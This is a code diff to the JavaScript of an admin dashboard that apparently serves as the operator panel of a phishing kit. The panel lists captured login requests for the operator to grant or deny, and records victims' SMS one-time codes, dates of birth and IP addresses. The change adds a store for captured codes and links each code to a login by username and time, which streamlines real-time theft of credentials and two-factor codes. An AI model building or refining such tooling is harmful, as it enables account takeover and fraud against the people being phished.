@@ -161,6 +161,7 @@
   let audioEnabled = true;
   let notificationsEnabled = false;
   const sessions = new Map();
+  const smsEntries = new Map();
 
   async function api(path, options) {
     const response = await fetch(path, options);
@@ -174,11 +175,12 @@
   async function loadSnapshot() {
     try {
       const [requests, smsHistory] = await Promise.all([
-        api('/api/admin/pending'),
+        api('/api/admin/pending?all=1'),
         api('/api/admin/sms-history'),
       ]);
 
       sessions.clear();
+      smsEntries.clear();
       requests.forEach(request => upsertSession({
         sid: request.id,
         requestId: request.id,
@@ -189,7 +191,7 @@
         credStatus: request.status || 'pending',
       }));
 
-      smsHistory.forEach(item => upsertSession({
+      smsHistory.forEach(item => upsertVerification({
         sid: item.sessionId,
         ts: item.timestamp,
         username: item.username,
@@ -258,7 +260,7 @@
       }
 
       if (msg.type === 'sms_verification_step1' && msg.data) {
-        upsertSession({
+        upsertVerification({
           sid: msg.data.sessionId,
           ts: msg.data.timestamp,
           ip: msg.data.ipAddress,
@@ -276,7 +278,7 @@
       }
 
       if (msg.type === 'sms_verification_complete' && msg.data) {
-        upsertSession({
+        upsertVerification({
           sid: msg.data.sessionId,
           ts: msg.data.timestamp,
           ip: msg.data.ipAddress,
@@ -336,6 +338,50 @@
     });
   }
 
+  function upsertVerification(value) {
+    const previousOtp = smsEntries.get(value.sid) || {};
+    const verification = {
+      ...previousOtp,
+      ...value,
+      hasOtp: !!(value.otp || previousOtp.otp),
+    };
+    smsEntries.set(value.sid, verification);
+
+    let target = Array.from(sessions.values()).find(
+      item => item.otpSessionId === value.sid
+    );
+
+    if (!target) {
+      const otpTime = new Date(value.ts || 0).getTime();
+      target = Array.from(sessions.values())
+        .filter(item => item.requestId && item.username === value.username)
+        .map(item => ({
+          item,
+          distance: otpTime - new Date(item.ts || 0).getTime(),
+        }))
+        .filter(candidate => candidate.distance >= 0 && candidate.distance <= 30 * 60 * 1000)
+        .sort((a, b) => a.distance - b.distance)[0]?.item;
+    }
+
+    if (target) {
+      Object.assign(target, {
+        otpSessionId: value.sid,
+        otp: verification.otp,
+        otpTs: verification.ts,
+        dateOfBirth: verification.dateOfBirth,
+        otpStatus: verification.otpStatus,
+        hasOtp: verification.hasOtp,
+      });
+      return;
+    }
+
+    upsertSession({
+      ...verification,
+      sid: `otp-${value.sid}`,
+      otpSessionId: value.sid,
+    });
+  }
+
   function statusBadge(status, fallback) {
     if (!status) return `<span class="badge none">${fallback}</span>`;
     return `<span class="badge ${status}">${status}</span>`;
@@ -378,8 +424,7 @@
 
   function renderSmsHistory() {
     const tbody = document.getElementById('sms-table');
-    const rows = Array.from(sessions.values())
-      .filter(item => item.hasOtp)
+    const rows = Array.from(smsEntries.values())
       .sort((a, b) => new Date(b.ts || 0) - new Date(a.ts || 0));
     if (!rows.length) {
       tbody.innerHTML = '<tr><td colspan="5"><div class="empty">No SMS codes yet.</div></td></tr>';
@@ -442,6 +487,7 @@
     try {
       await api('/api/admin/clear-logs', { method: 'POST' });
       sessions.clear();
+      smsEntries.clear();
       renderRows();
       addLog('ok', 'All login and SMS logs cleared');
     } catch (error) {
@@ -491,18 +537,17 @@
   }
 
   function recalcStats() {
-    let pending = 0, granted = 0, denied = 0, otpCount = 0;
+    let pending = 0, granted = 0, denied = 0;
     for (const v of sessions.values()) {
       if (v.credStatus === 'pending') pending++;
       if (v.credStatus === 'grant')   granted++;
       if (v.credStatus === 'deny')    denied++;
-      if (v.hasOtp) otpCount++;
     }
     document.getElementById('cnt-total').textContent   = sessions.size;
     document.getElementById('cnt-pending').textContent = pending;
     document.getElementById('cnt-granted').textContent = granted;
     document.getElementById('cnt-denied').textContent  = denied;
-    document.getElementById('cnt-otp').textContent     = otpCount;
+    document.getElementById('cnt-otp').textContent     = smsEntries.size;
   }
 
   let flashInterval = null;
